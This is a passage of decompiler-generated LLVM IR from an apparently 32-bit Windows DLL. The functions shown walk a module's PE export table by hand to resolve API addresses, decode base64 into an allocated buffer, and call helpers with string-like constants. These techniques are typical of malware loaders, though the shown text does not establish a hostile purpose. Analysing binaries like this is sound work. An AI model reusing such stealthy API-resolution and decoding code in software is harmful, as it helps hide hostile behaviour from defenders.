  store i32 0, i32* %218, align 4, !insn.addr !5238
  %219 = add i32 %esp.2.reload, -36, !insn.addr !5239
  %220 = inttoptr i32 %219 to i32*, !insn.addr !5239
  %221 = ptrtoint i32* %stack_var_-1204 to i32, !insn.addr !5239
  store i32 %221, i32* %220, align 4, !insn.addr !5239
  %222 = load i32, i32* @global_var_10040984, align 4, !insn.addr !5240
  %223 = icmp eq i32 %222, 0, !insn.addr !5240
  br i1 %223, label %dec_label_pc_1000937d, label %dec_label_pc_1000923c, !insn.addr !5241

dec_label_pc_1000923c:                            ; preds = %dec_label_pc_100091b7
  %224 = load i128, i128* @global_var_10039c30, align 4, !insn.addr !5242
  %225 = call i128 @__asm_movaps(i128 %224), !insn.addr !5242
  %226 = add i32 %esp.2.reload, -40, !insn.addr !5243
  %227 = inttoptr i32 %226 to i32*, !insn.addr !5243
  store i32 0, i32* %227, align 4, !insn.addr !5243
  %228 = add i32 %esp.2.reload, -44, !insn.addr !5244
  %229 = inttoptr i32 %228 to i32*, !insn.addr !5244
  store i32 1, i32* %229, align 4, !insn.addr !5244
  %230 = add i32 %esp.2.reload, -48, !insn.addr !5245
  %231 = inttoptr i32 %230 to i32*, !insn.addr !5245
  store i32 %50, i32* %231, align 4, !insn.addr !5245
  call void @__asm_movups(i128 undef, i128 %225), !insn.addr !5246
  %232 = add i32 %esp.2.reload, -52, !insn.addr !5247
  %233 = inttoptr i32 %232 to i32*, !insn.addr !5247
  store i32 1, i32* %233, align 4, !insn.addr !5247
  %234 = add i32 %esp.2.reload, -56, !insn.addr !5248
  %235 = inttoptr i32 %234 to i32*, !insn.addr !5248
  store i32 %arg1, i32* %235, align 4, !insn.addr !5248
  %236 = add i32 %esp.2.reload, -60, !insn.addr !5249
  %237 = inttoptr i32 %236 to i32*, !insn.addr !5249
  %238 = ptrtoint i8** %stack_var_-1184 to i32, !insn.addr !5249
  store i32 %238, i32* %237, align 4, !insn.addr !5249
  %239 = call i32 @function_1000a4e0(i32 1634296933, i32 1735552814, i8 0, i32 ptrtoint (i32* @1 to i32)), !insn.addr !5250
  %240 = icmp eq i32 %239, 0, !insn.addr !5251
  %241 = icmp eq i1 %240, false, !insn.addr !5252
  br i1 %241, label %dec_label_pc_10009359, label %dec_label_pc_100092a4, !insn.addr !5252

dec_label_pc_100092a4:                            ; preds = %dec_label_pc_1000923c
  store i32 1, i32* %233, align 4, !insn.addr !5253
  store i32 %arg1, i32* %235, align 4, !insn.addr !5254
  store i32 %238, i32* %237, align 4, !insn.addr !5255
  %242 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5256
  %243 = icmp eq i32 %242, 0, !insn.addr !5257
  %244 = icmp eq i1 %243, false, !insn.addr !5258
  br i1 %244, label %dec_label_pc_10009359, label %dec_label_pc_100092c7, !insn.addr !5258

dec_label_pc_100092c7:                            ; preds = %dec_label_pc_100092a4
  store i32 1, i32* %233, align 4, !insn.addr !5259
  store i32 %arg1, i32* %235, align 4, !insn.addr !5260
  store i32 %238, i32* %237, align 4, !insn.addr !5261
  %245 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5262
  %246 = icmp eq i32 %245, 0, !insn.addr !5263
  %247 = icmp eq i1 %246, false, !insn.addr !5264
  br i1 %247, label %dec_label_pc_10009359, label %dec_label_pc_100092e6, !insn.addr !5264

dec_label_pc_100092e6:                            ; preds = %dec_label_pc_100092c7
  store i32 1, i32* %233, align 4, !insn.addr !5265
  store i32 %arg1, i32* %235, align 4, !insn.addr !5266
  store i32 %238, i32* %237, align 4, !insn.addr !5267
  %248 = call i32 @function_1000a4e0(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i8 ptrtoint (i32* @1 to i8), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5268
  %249 = icmp eq i32 %248, 0, !insn.addr !5269
  %250 = icmp eq i1 %249, false, !insn.addr !5270
  br i1 %250, label %dec_label_pc_10009359, label %dec_label_pc_10009305, !insn.addr !5270

dec_label_pc_10009305:                            ; preds = %dec_label_pc_100092e6
  store i32 %238, i32* %233, align 4, !insn.addr !5271
  %251 = call i32 @function_1000a390(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5272
  %252 = icmp eq i32 %251, 0, !insn.addr !5273
  %253 = icmp eq i1 %252, false, !insn.addr !5274
  br i1 %253, label %dec_label_pc_10009359, label %dec_label_pc_10009321, !insn.addr !5274

dec_label_pc_10009321:                            ; preds = %dec_label_pc_10009305
  store i32 %238, i32* %233, align 4, !insn.addr !5275
  %254 = call i32 @function_1000a390(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5276
  %255 = icmp eq i32 %254, 0, !insn.addr !5277
  %256 = icmp eq i1 %255, false, !insn.addr !5278
  br i1 %256, label %dec_label_pc_10009359, label %dec_label_pc_1000933d, !insn.addr !5278

dec_label_pc_1000933d:                            ; preds = %dec_label_pc_10009321
  store i32 %238, i32* %233, align 4, !insn.addr !5279
  %257 = call i32 @function_1000a390(i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !5280
  %258 = icmp eq i32 %257, 0, !insn.addr !5281
  br i1 %258, label %dec_label_pc_1000937d, label %dec_label_pc_10009359, !insn.addr !5282

dec_label_pc_10009359:                            ; preds = %dec_label_pc_1000933d, %dec_label_pc_10009321, %dec_label_pc_10009305, %dec_label_pc_100092e6, %dec_label_pc_100092c7, %dec_label_pc_100092a4, %dec_label_pc_1000923c
  %259 = add i32 %esp.2.reload, -64, !insn.addr !5283
  %260 = inttoptr i32 %259 to i32*, !insn.addr !5283
  %261 = inttoptr i32 %arg2 to i32*, !insn.addr !5284
  store i32 1, i32* %261, align 4, !insn.addr !5284
  %262 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5285
  ret i32 %262, !insn.addr !5286

dec_label_pc_1000937d:                            ; preds = %dec_label_pc_1000933d, %dec_label_pc_100091b7
  %263 = call i32 @"@__security_check_cookie@4"(), !insn.addr !5287
  ret i32 %263, !insn.addr !5288
}

define i32 @function_10009390() local_unnamed_addr {
dec_label_pc_10009390:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = add i32 %1, 60, !insn.addr !5289
  %3 = inttoptr i32 %2 to i32*, !insn.addr !5289
  %4 = load i32, i32* %3, align 4, !insn.addr !5289
  %5 = add i32 %1, 120, !insn.addr !5290
  %6 = add i32 %5, %4, !insn.addr !5290
  %7 = inttoptr i32 %6 to i32*, !insn.addr !5290
  %8 = load i32, i32* %7, align 4, !insn.addr !5290
  %9 = add i32 %8, %1, !insn.addr !5291
  %10 = inttoptr i32 %0 to i32*, !insn.addr !5292
  %11 = call i32 @function_10009e60(i32 %1, i32* %10), !insn.addr !5292
  %12 = add i32 %9, 36, !insn.addr !5293
  %13 = inttoptr i32 %12 to i32*, !insn.addr !5293
  %14 = load i32, i32* %13, align 4, !insn.addr !5293
  %15 = mul i32 %11, 2, !insn.addr !5294
  %16 = add i32 %15, %1, !insn.addr !5294
  %17 = add i32 %16, %14, !insn.addr !5295
  %18 = inttoptr i32 %17 to i16*, !insn.addr !5295
  %19 = load i16, i16* %18, align 2, !insn.addr !5295
  %20 = zext i16 %19 to i32, !insn.addr !5295
  %21 = add i32 %9, 28, !insn.addr !5296
  %22 = inttoptr i32 %21 to i32*, !insn.addr !5296
  %23 = load i32, i32* %22, align 4, !insn.addr !5296
  %24 = mul i32 %20, 4, !insn.addr !5297
  %25 = add i32 %23, %1, !insn.addr !5297
  %26 = add i32 %25, %24, !insn.addr !5298
  %27 = inttoptr i32 %26 to i32*, !insn.addr !5298
  %28 = load i32, i32* %27, align 4, !insn.addr !5298
  %29 = add i32 %28, %1, !insn.addr !5299
  ret i32 %29, !insn.addr !5300
}

define i32 @function_100093d0() local_unnamed_addr {
dec_label_pc_100093d0:
  %ebx.3.reg2mem = alloca i32, !insn.addr !5301
  %stack_var_-8.2.reg2mem = alloca i8*, !insn.addr !5301
  %.reg2mem28 = alloca i32, !insn.addr !5301
  %.pn.reg2mem = alloca i32, !insn.addr !5301
  %stack_var_-8.1.reg2mem = alloca i8*, !insn.addr !5301
  %.reg2mem26 = alloca i32, !insn.addr !5301
  %eax.5.reg2mem = alloca i32, !insn.addr !5301
  %ecx.1.reg2mem = alloca i32, !insn.addr !5301
  %.reg2mem24 = alloca i32, !insn.addr !5301
  %.pn17.reg2mem = alloca i32, !insn.addr !5301
  %.pn5.reg2mem = alloca i32, !insn.addr !5301
  %.reg2mem22 = alloca i32, !insn.addr !5301
  %.reg2mem20 = alloca i32, !insn.addr !5301
  %esi.1.reg2mem = alloca i32, !insn.addr !5301
  %stack_var_-8.0.reg2mem = alloca i8*, !insn.addr !5301
  %.reg2mem18 = alloca i32, !insn.addr !5301
  %edi.1.reg2mem = alloca i32, !insn.addr !5301
  %edi.0.reg2mem = alloca i32, !insn.addr !5301
  %esi.0.reg2mem = alloca i32, !insn.addr !5301
  %.reg2mem = alloca i8, !insn.addr !5301
  %edx = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %2 = icmp eq i32 %0, 0, !insn.addr !5302
  %3 = trunc i32 %0 to i8
  %4 = icmp eq i8 %3, 0, !insn.addr !5303
  %or.cond = or i1 %2, %4
  br i1 %or.cond, label %dec_label_pc_100095c3, label %dec_label_pc_10009414.preheader, !insn.addr !5304

dec_label_pc_10009414.preheader:                  ; preds = %dec_label_pc_100093d0
  %5 = inttoptr i32 %0 to i8*, !insn.addr !5305
  %6 = inttoptr i32 %1 to i8*, !insn.addr !5306
  %7 = call i32 @lstrlenA(i8* %5), !insn.addr !5307
  %8 = add i32 %7, 1, !insn.addr !5308
  %9 = call i32* @LocalAlloc(i32 64, i32 %8), !insn.addr !5309
  %10 = ptrtoint i32* %9 to i32, !insn.addr !5309
  %.pre = load i8, i8* %5, align 1
  store i8 %.pre, i8* %.reg2mem
  store i32 0, i32* %edi.0.reg2mem
  br label %dec_label_pc_10009414

dec_label_pc_10009414:                            ; preds = %dec_label_pc_10009414.preheader, %dec_label_pc_10009447
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %.reload = load i8, i8* %.reg2mem, !insn.addr !5310
  %11 = and i8 %.reload, -33
  %12 = add i8 %11, -65
  %13 = icmp ult i8 %12, 26
  br i1 %13, label %dec_label_pc_10009443, label %dec_label_pc_1000942a, !insn.addr !5311

dec_label_pc_1000942a:                            ; preds = %dec_label_pc_10009414
  %.off13 = add i8 %.reload, -48
  %14 = icmp ugt i8 %.off13, 9
  %15 = or i8 %.reload, 4
  %16 = icmp ne i8 %15, 47
  %or.cond9.not = icmp eq i1 %14, %16
  %17 = icmp eq i8 %.reload, 61, !insn.addr !5312
  %18 = icmp eq i1 %17, false, !insn.addr !5313
  %or.cond11 = icmp eq i1 %18, %or.cond9.not
  store i32 %edi.0.reload, i32* %edi.1.reg2mem, !insn.addr !5314
  br i1 %or.cond11, label %dec_label_pc_10009447, label %dec_label_pc_10009443, !insn.addr !5314

dec_label_pc_10009443:                            ; preds = %dec_label_pc_1000942a, %dec_label_pc_10009414
  %19 = add i32 %edi.0.reload, %10, !insn.addr !5315
  %20 = inttoptr i32 %19 to i8*, !insn.addr !5315
  store i8 %.reload, i8* %20, align 1, !insn.addr !5315
  %21 = add i32 %edi.0.reload, 1, !insn.addr !5316
  store i32 %21, i32* %edi.1.reg2mem, !insn.addr !5316
  br label %dec_label_pc_10009447, !insn.addr !5316

dec_label_pc_10009447:                            ; preds = %dec_label_pc_1000942a, %dec_label_pc_10009443
  %edi.1.reload = load i32, i32* %edi.1.reg2mem
  %22 = add i32 %esi.0.reload, 1, !insn.addr !5317
  %23 = inttoptr i32 %22 to i8*, !insn.addr !5318
  %24 = load i8, i8* %23, align 1, !insn.addr !5318
  %25 = icmp eq i8 %24, 0, !insn.addr !5318
  %26 = icmp eq i1 %25, false, !insn.addr !5319
  store i8 %24, i8* %.reg2mem, !insn.addr !5319
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !5319
  store i32 %edi.1.reload, i32* %edi.0.reg2mem, !insn.addr !5319
  br i1 %26, label %dec_label_pc_10009414, label %dec_label_pc_10009450, !insn.addr !5319

dec_label_pc_10009450:                            ; preds = %dec_label_pc_10009447
  %27 = icmp slt i32 %edi.1.reload, 1
  br i1 %27, label %dec_label_pc_100095b0, label %dec_label_pc_10009460.preheader, !insn.addr !5320

dec_label_pc_10009460.preheader:                  ; preds = %dec_label_pc_10009450
  %.pre15 = load i32, i32* %edx, align 4
  store i32 %.pre15, i32* %.reg2mem18
  store i8* %6, i8** %stack_var_-8.0.reg2mem
  store i32 0, i32* %esi.1.reg2mem
  br label %dec_label_pc_10009460

dec_label_pc_10009460:                            ; preds = %dec_label_pc_10009460.preheader, %dec_label_pc_1000959f
  %esi.1.reload = load i32, i32* %esi.1.reg2mem
  %stack_var_-8.0.reload = load i8*, i8** %stack_var_-8.0.reg2mem
  %.reload19 = load i32, i32* %.reg2mem18, !insn.addr !5321
  %28 = add i32 %esi.1.reload, %10, !insn.addr !5322
  %29 = inttoptr i32 %28 to i8*, !insn.addr !5322
  %30 = load i8, i8* %29, align 1, !insn.addr !5322
  %31 = or i32 %esi.1.reload, 1, !insn.addr !5323
  %32 = and i32 %.reload19, -65536, !insn.addr !5321
  %33 = or i32 %32, 16705, !insn.addr !5324
  store i32 %33, i32* %edx, align 4, !insn.addr !5324
  %34 = icmp slt i32 %31, %edi.1.reload, !insn.addr !5325
  store i32 %33, i32* %.reg2mem20, !insn.addr !5325
  br i1 %34, label %dec_label_pc_10009470, label %dec_label_pc_10009474, !insn.addr !5325

dec_label_pc_10009470:                            ; preds = %dec_label_pc_10009460
  %35 = add i32 %31, %10, !insn.addr !5326
  %36 = inttoptr i32 %35 to i8*, !insn.addr !5326
  %37 = load i8, i8* %36, align 1, !insn.addr !5326
  %38 = zext i8 %37 to i32, !insn.addr !5326
  %39 = or i32 %32, %38, !insn.addr !5326
  %40 = or i32 %39, 16640, !insn.addr !5326
  store i32 %40, i32* %edx, align 4, !insn.addr !5326
  store i32 %40, i32* %.reg2mem20, !insn.addr !5326
  br label %dec_label_pc_10009474, !insn.addr !5326

dec_label_pc_10009474:                            ; preds = %dec_label_pc_10009460, %dec_label_pc_10009470
  %.reload21 = load i32, i32* %.reg2mem20, !insn.addr !5327
  %41 = add nuw nsw i32 %31, 1, !insn.addr !5328
  %42 = icmp slt i32 %41, %edi.1.reload, !insn.addr !5329
  store i32 %.reload21, i32* %.reg2mem22, !insn.addr !5329
  br i1 %42, label %dec_label_pc_1000947b, label %dec_label_pc_10009482, !insn.addr !5329

dec_label_pc_1000947b:                            ; preds = %dec_label_pc_10009474
  %43 = or i32 %esi.1.reload, 2, !insn.addr !5327
  %44 = add i32 %43, %10, !insn.addr !5327
  %45 = inttoptr i32 %44 to i8*, !insn.addr !5327
  %46 = load i8, i8* %45, align 1, !insn.addr !5327
  %47 = zext i8 %46 to i32, !insn.addr !5327
  %48 = mul i32 %47, 256, !insn.addr !5327
  %49 = and i32 %.reload21, -65281, !insn.addr !5327
  %50 = or i32 %48, %49, !insn.addr !5327
  store i32 %50, i32* %edx, align 4, !insn.addr !5327
  store i32 %50, i32* %.reg2mem22, !insn.addr !5327
  br label %dec_label_pc_10009482, !insn.addr !5327

dec_label_pc_10009482:                            ; preds = %dec_label_pc_10009474, %dec_label_pc_1000947b
  %.reload23 = load i32, i32* %.reg2mem22
  %51 = or i32 %esi.1.reload, 3, !insn.addr !5330
  %52 = icmp slt i32 %51, %edi.1.reload, !insn.addr !5331
  store i32 16640, i32* %.pn5.reg2mem, !insn.addr !5331
  br i1 %52, label %dec_label_pc_10009489, label %dec_label_pc_10009490, !insn.addr !5331

dec_label_pc_10009489:                            ; preds = %dec_label_pc_10009482
  %53 = add i32 %51, %10, !insn.addr !5332
  %54 = inttoptr i32 %53 to i8*, !insn.addr !5332
  %55 = load i8, i8* %54, align 1, !insn.addr !5332
  %56 = zext i8 %55 to i32, !insn.addr !5332
  %57 = mul i32 %56, 256, !insn.addr !5332
  store i32 %57, i32* %.pn5.reg2mem, !insn.addr !5332
  br label %dec_label_pc_10009490, !insn.addr !5332

dec_label_pc_10009490:                            ; preds = %dec_label_pc_10009482, %dec_label_pc_10009489
  %.pn5.reload = load i32, i32* %.pn5.reg2mem
  %58 = add i8 %30, -65, !insn.addr !5333
  %59 = icmp ult i8 %58, 26
  br i1 %59, label %dec_label_pc_10009498, label %dec_label_pc_1000949d, !insn.addr !5334

dec_label_pc_10009498:                            ; preds = %dec_label_pc_10009490
  %60 = zext i8 %58 to i32, !insn.addr !5335
  store i32 %60, i32* %.pn17.reg2mem, !insn.addr !5336
  br label %dec_label_pc_100094c0, !insn.addr !5336

dec_label_pc_1000949d:                            ; preds = %dec_label_pc_10009490
  %61 = add i8 %30, -97, !insn.addr !5337
  %62 = icmp ult i8 %61, 26
  br i1 %62, label %dec_label_pc_100094a5, label %dec_label_pc_100094aa, !insn.addr !5338

dec_label_pc_100094a5:                            ; preds = %dec_label_pc_1000949d
  %63 = add i8 %30, -71
  %64 = zext i8 %63 to i32, !insn.addr !5339
  store i32 %64, i32* %.pn17.reg2mem, !insn.addr !5340
  br label %dec_label_pc_100094c0, !insn.addr !5340

dec_label_pc_100094aa:                            ; preds = %dec_label_pc_1000949d
  %65 = add i8 %30, -48, !insn.addr !5341
  %66 = icmp ult i8 %65, 10
  br i1 %66, label %dec_label_pc_100094b2, label %dec_label_pc_100094b7, !insn.addr !5342

dec_label_pc_100094b2:                            ; preds = %dec_label_pc_100094aa
  %67 = add i8 %30, 4
  %68 = zext i8 %67 to i32, !insn.addr !5343
  store i32 %68, i32* %.pn17.reg2mem, !insn.addr !5344
  br label %dec_label_pc_100094c0, !insn.addr !5344

dec_label_pc_100094b7:                            ; preds = %dec_label_pc_100094aa
  %69 = icmp eq i8 %30, 43, !insn.addr !5345
  %70 = icmp eq i1 %69, false, !insn.addr !5346
  %71 = select i1 %70, i32 63, i32 62, !insn.addr !5347
  store i32 %71, i32* %.pn17.reg2mem, !insn.addr !5347
  br label %dec_label_pc_100094c0, !insn.addr !5347

dec_label_pc_100094c0:                            ; preds = %dec_label_pc_100094b7, %dec_label_pc_100094b2, %dec_label_pc_100094a5, %dec_label_pc_10009498
  %.pn17.reload = load i32, i32* %.pn17.reg2mem
  %72 = trunc i32 %.reload23 to i8
  %73 = add i8 %72, -65, !insn.addr !5348
  %74 = icmp ult i8 %73, 26
  br i1 %74, label %dec_label_pc_100094c8, label %dec_label_pc_100094cd, !insn.addr !5349

dec_label_pc_100094c8:                            ; preds = %dec_label_pc_100094c0
  %75 = add i32 %.reload23, 191, !insn.addr !5350
  %76 = and i32 %75, 255, !insn.addr !5350
  %77 = and i32 %.reload23, -256, !insn.addr !5350
  %78 = or i32 %76, %77, !insn.addr !5350
  store i32 %78, i32* %edx, align 4, !insn.addr !5350
  store i32 %78, i32* %.reg2mem24, !insn.addr !5351
  br label %dec_label_pc_100094f0, !insn.addr !5351

dec_label_pc_100094cd:                            ; preds = %dec_label_pc_100094c0
  %79 = add i8 %72, -97, !insn.addr !5352
  %80 = icmp ult i8 %79, 26
  br i1 %80, label %dec_label_pc_100094d5, label %dec_label_pc_100094da, !insn.addr !5353

dec_label_pc_100094d5:                            ; preds = %dec_label_pc_100094cd
  %81 = add i32 %.reload23, 185, !insn.addr !5354
  %82 = and i32 %81, 255, !insn.addr !5354
  %83 = and i32 %.reload23, -256, !insn.addr !5354
  %84 = or i32 %82, %83, !insn.addr !5354
  store i32 %84, i32* %edx, align 4, !insn.addr !5354
  store i32 %84, i32* %.reg2mem24, !insn.addr !5355
  br label %dec_label_pc_100094f0, !insn.addr !5355

dec_label_pc_100094da:                            ; preds = %dec_label_pc_100094cd
  %85 = add i8 %72, -48, !insn.addr !5356
  %86 = icmp ult i8 %85, 10
  br i1 %86, label %dec_label_pc_100094e2, label %dec_label_pc_100094e7, !insn.addr !5357

dec_label_pc_100094e2:                            ; preds = %dec_label_pc_100094da
  %87 = add i32 %.reload23, 4, !insn.addr !5358
  %88 = and i32 %87, 255, !insn.addr !5358
  %89 = and i32 %.reload23, -256, !insn.addr !5358
  %90 = or i32 %88, %89, !insn.addr !5358
  store i32 %90, i32* %edx, align 4, !insn.addr !5358
  store i32 %90, i32* %.reg2mem24, !insn.addr !5359
  br label %dec_label_pc_100094f0, !insn.addr !5359

dec_label_pc_100094e7:                            ; preds = %dec_label_pc_100094da
  %91 = icmp eq i8 %72, 43, !insn.addr !5360
  %92 = icmp eq i1 %91, false, !insn.addr !5361
  %93 = and i32 %.reload23, -256, !insn.addr !5361
  %94 = select i1 %92, i32 63, i32 62, !insn.addr !5362
  %95 = or i32 %94, %93, !insn.addr !5362
  store i32 %95, i32* %edx, align 4, !insn.addr !5362
  store i32 %95, i32* %.reg2mem24, !insn.addr !5362
  br label %dec_label_pc_100094f0, !insn.addr !5362

dec_label_pc_100094f0:                            ; preds = %dec_label_pc_100094e7, %dec_label_pc_100094e2, %dec_label_pc_100094d5, %dec_label_pc_100094c8
  %.reload25 = load i32, i32* %.reg2mem24, !insn.addr !5363
  %96 = udiv i32 %.reload25, 256, !insn.addr !5364
  %97 = trunc i32 %96 to i8
  %98 = add i8 %97, -65, !insn.addr !5365
  %99 = icmp ult i8 %98, 26
  br i1 %99, label %dec_label_pc_100094f8, label %dec_label_pc_100094ff, !insn.addr !5366

dec_label_pc_100094f8:                            ; preds = %dec_label_pc_100094f0
  %100 = add nuw nsw i32 %96, 191, !insn.addr !5367
  %101 = and i32 %100, 255, !insn.addr !5367
  store i32 %101, i32* %ecx.1.reg2mem, !insn.addr !5368
  br label %dec_label_pc_10009526, !insn.addr !5368

dec_label_pc_100094ff:                            ; preds = %dec_label_pc_100094f0
  %102 = add i8 %97, -97, !insn.addr !5369
  %103 = icmp ult i8 %102, 26
  br i1 %103, label %dec_label_pc_10009507, label %dec_label_pc_1000950e, !insn.addr !5370

dec_label_pc_10009507:                            ; preds = %dec_label_pc_100094ff
  %104 = add nuw nsw i32 %96, 185, !insn.addr !5371
  %105 = and i32 %104, 255, !insn.addr !5371
  store i32 %105, i32* %ecx.1.reg2mem, !insn.addr !5372
  br label %dec_label_pc_10009526, !insn.addr !5372

dec_label_pc_1000950e:                            ; preds = %dec_label_pc_100094ff
  %106 = add i8 %97, -48, !insn.addr !5373
  %107 = icmp ult i8 %106, 10
  br i1 %107, label %dec_label_pc_10009516, label %dec_label_pc_1000951d, !insn.addr !5374

dec_label_pc_10009516:                            ; preds = %dec_label_pc_1000950e
  %108 = add nuw nsw i32 %96, 4, !insn.addr !5375
  %109 = and i32 %108, 255, !insn.addr !5375
  store i32 %109, i32* %ecx.1.reg2mem, !insn.addr !5376
  br label %dec_label_pc_10009526, !insn.addr !5376

dec_label_pc_1000951d:                            ; preds = %dec_label_pc_1000950e
  %110 = icmp eq i8 %97, 43, !insn.addr !5377
  %111 = icmp eq i1 %110, false, !insn.addr !5378
  %112 = select i1 %111, i32 63, i32 62, !insn.addr !5379
  store i32 %112, i32* %ecx.1.reg2mem, !insn.addr !5379
  br label %dec_label_pc_10009526, !insn.addr !5379

dec_label_pc_10009526:                            ; preds = %dec_label_pc_1000951d, %dec_label_pc_10009516, %dec_label_pc_10009507, %dec_label_pc_100094f8
  %ebx.2 = or i32 %.pn17.reload, %.pn5.reload
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %113 = udiv i32 %.pn5.reload, 256, !insn.addr !5380
  %114 = trunc i32 %113 to i8
  %115 = add i8 %114, -65, !insn.addr !5381
  %116 = icmp ult i8 %115, 26
  br i1 %116, label %dec_label_pc_1000952e, label %dec_label_pc_10009535, !insn.addr !5382

dec_label_pc_1000952e:                            ; preds = %dec_label_pc_10009526
  %117 = add nsw i32 %ebx.2, 48896
  %118 = and i32 %117, 65280, !insn.addr !5383
  store i32 %118, i32* %eax.5.reg2mem, !insn.addr !5384
  br label %dec_label_pc_1000955c, !insn.addr !5384

dec_label_pc_10009535:                            ; preds = %dec_label_pc_10009526
  %119 = add i8 %114, -97, !insn.addr !5385
  %120 = icmp ult i8 %119, 26
  br i1 %120, label %dec_label_pc_1000953d, label %dec_label_pc_10009544, !insn.addr !5386

dec_label_pc_1000953d:                            ; preds = %dec_label_pc_10009535
  %121 = add nsw i32 %ebx.2, 47360
  %122 = and i32 %121, 65280, !insn.addr !5387
  store i32 %122, i32* %eax.5.reg2mem, !insn.addr !5388
  br label %dec_label_pc_1000955c, !insn.addr !5388

dec_label_pc_10009544:                            ; preds = %dec_label_pc_10009535
  %123 = add i8 %114, -48, !insn.addr !5389
  %124 = icmp ult i8 %123, 10
  br i1 %124, label %dec_label_pc_1000954c, label %dec_label_pc_10009553, !insn.addr !5390

dec_label_pc_1000954c:                            ; preds = %dec_label_pc_10009544
  %125 = add nsw i32 %ebx.2, 1024
  %126 = and i32 %125, 65280, !insn.addr !5391
  store i32 %126, i32* %eax.5.reg2mem, !insn.addr !5392
  br label %dec_label_pc_1000955c, !insn.addr !5392

dec_label_pc_10009553:                            ; preds = %dec_label_pc_10009544
  %127 = and i32 %.pn5.reload, 65280
  %128 = icmp eq i32 %127, 11008, !insn.addr !5393
  %129 = icmp eq i1 %128, false, !insn.addr !5394
  %130 = zext i1 %129 to i32, !insn.addr !5394
  %131 = mul i32 %130, 256, !insn.addr !5395
  %132 = or i32 %131, 15872, !insn.addr !5395
  store i32 %132, i32* %eax.5.reg2mem, !insn.addr !5395
  br label %dec_label_pc_1000955c, !insn.addr !5395

dec_label_pc_1000955c:                            ; preds = %dec_label_pc_10009553, %dec_label_pc_1000954c, %dec_label_pc_1000953d, %dec_label_pc_1000952e
  %eax.5.reload = load i32, i32* %eax.5.reg2mem
  %133 = ptrtoint i8* %stack_var_-8.0.reload to i32, !insn.addr !5396
  %134 = udiv i32 %.reload25, 16, !insn.addr !5397
  %135 = and i32 %134, 15, !insn.addr !5397
  %136 = mul i32 %ebx.2, 4, !insn.addr !5398
  %137 = and i32 %136, 252, !insn.addr !5398
  %138 = or i32 %135, %137, !insn.addr !5399
  %139 = trunc i32 %138 to i8, !insn.addr !5400
  store i8 %139, i8* %stack_var_-8.0.reload, align 1, !insn.addr !5400
  %140 = add i32 %133, 1, !insn.addr !5401
  %141 = inttoptr i32 %140 to i8*, !insn.addr !5402
  %142 = load i32, i32* %edx, align 4, !insn.addr !5403
  %143 = and i32 %142, 65280
  %144 = icmp eq i32 %143, 15616, !insn.addr !5403
  br i1 %144, label %dec_label_pc_1000958c, label %dec_label_pc_10009577, !insn.addr !5404

dec_label_pc_10009577:                            ; preds = %dec_label_pc_1000955c
  %145 = mul i32 %142, 16, !insn.addr !5405
  %146 = udiv i32 %ecx.1.reload, 4, !insn.addr !5406
  %.masked3 = and i32 %145, 240
  %147 = or i32 %.masked3, %146, !insn.addr !5407
  %148 = trunc i32 %147 to i8, !insn.addr !5408
  store i8 %148, i8* %141, align 1, !insn.addr !5408
  %149 = add i32 %133, 2, !insn.addr !5409
  store i32 %149, i32* %edx, align 4, !insn.addr !5409
  %150 = inttoptr i32 %149 to i8*, !insn.addr !5410
  store i32 %149, i32* %.reg2mem26, !insn.addr !5411
  store i8* %150, i8** %stack_var_-8.1.reg2mem, !insn.addr !5411
  store i32 %147, i32* %.pn.reg2mem, !insn.addr !5411
  br label %dec_label_pc_1000958f, !insn.addr !5411

dec_label_pc_1000958c:                            ; preds = %dec_label_pc_1000955c
  store i32 %140, i32* %edx, align 4, !insn.addr !5412
  store i32 %140, i32* %.reg2mem26, !insn.addr !5412
  store i8* %141, i8** %stack_var_-8.1.reg2mem, !insn.addr !5412
  store i32 %138, i32* %.pn.reg2mem, !insn.addr !5412
  br label %dec_label_pc_1000958f, !insn.addr !5412

dec_label_pc_1000958f:                            ; preds = %dec_label_pc_1000958c, %dec_label_pc_10009577
  %stack_var_-8.1.reload = load i8*, i8** %stack_var_-8.1.reg2mem
  %.reload27 = load i32, i32* %.reg2mem26, !insn.addr !5413
  %151 = and i32 %.pn5.reload, 65280
  %152 = icmp eq i32 %151, 15616, !insn.addr !5414
  store i32 %.reload27, i32* %.reg2mem28, !insn.addr !5415
  store i8* %stack_var_-8.1.reload, i8** %stack_var_-8.2.reg2mem, !insn.addr !5415
  br i1 %152, label %dec_label_pc_1000959f, label %dec_label_pc_10009594, !insn.addr !5415

dec_label_pc_10009594:                            ; preds = %dec_label_pc_1000958f
  %.pn.reload = load i32, i32* %.pn.reg2mem
  %eax.6 = or i32 %.pn.reload, %eax.5.reload
  %153 = mul i32 %ecx.1.reload, 64, !insn.addr !5416
  %154 = udiv i32 %eax.6, 256, !insn.addr !5417
  %155 = or i32 %154, %153
  %156 = trunc i32 %155 to i8, !insn.addr !5413
  %157 = inttoptr i32 %.reload27 to i8*, !insn.addr !5413
  store i8 %156, i8* %157, align 1, !insn.addr !5413
  %158 = load i32, i32* %edx, align 4, !insn.addr !5418
  %159 = add i32 %158, 1, !insn.addr !5418
  store i32 %159, i32* %edx, align 4, !insn.addr !5418
  %160 = inttoptr i32 %159 to i8*, !insn.addr !5419
  store i32 %159, i32* %.reg2mem28, !insn.addr !5419
  store i8* %160, i8** %stack_var_-8.2.reg2mem, !insn.addr !5419
